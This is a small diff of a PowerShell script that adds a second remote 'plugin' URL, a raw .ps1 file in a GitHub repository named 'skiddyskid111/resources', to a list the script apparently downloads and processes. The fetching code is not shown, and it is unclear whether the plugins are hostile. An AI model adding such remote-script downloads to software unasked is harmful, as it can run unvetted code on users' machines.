@@ -40,7 +40,8 @@ Invoke-Retry {
 }
 
 $pluginUrls = @(
-    "https://github.com/skiddyskid111/resources/raw/main/plugins/plugin1.ps1"
+    "https://github.com/skiddyskid111/resources/raw/main/plugins/plugin1.ps1",
+    "https://github.com/skiddyskid111/resources/raw/main/plugins/plugin2.ps1"
 )
 
 $scriptPaths = @()
